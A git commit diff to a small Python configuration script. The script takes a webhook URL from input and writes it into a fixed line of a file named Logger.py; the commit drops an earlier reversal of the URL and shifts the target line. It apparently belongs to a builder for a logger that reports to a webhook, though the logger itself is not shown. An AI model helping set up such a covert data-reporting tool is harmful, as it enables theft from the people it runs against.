082e2b3d8a6005b0c907675447df8b4de2edeba5
TurtlesXD <116833814+TurtlesXD@users.noreply.github.com>
2023-09-17 18:26:11 +0100

    Update ScriptConfig.py

--- ScriptConfig.py
+++ ScriptConfig.py
@@ -4,16 +4,16 @@ file_path = 'Logger.py'
 url = input('Your webhook url here: ')
 
 
-changedline=f'webhookurl="{url[::-1]}"'
+changedline=f'webhookurl="{url}"'
 
 # Read the content of the file
 with open(file_path, 'r') as file:
     lines = file.readlines()
 
 # Check if there are at least 32 lines in the file
-if len(lines) >= 32:
+if len(lines) >= 34:
     # Modify line 32 with the new content
-    lines[31] = changedline + '\n'
+    lines[33] = changedline + '\n'
 
     # Write the updated content back to the file
     with open(file_path, 'w') as file:
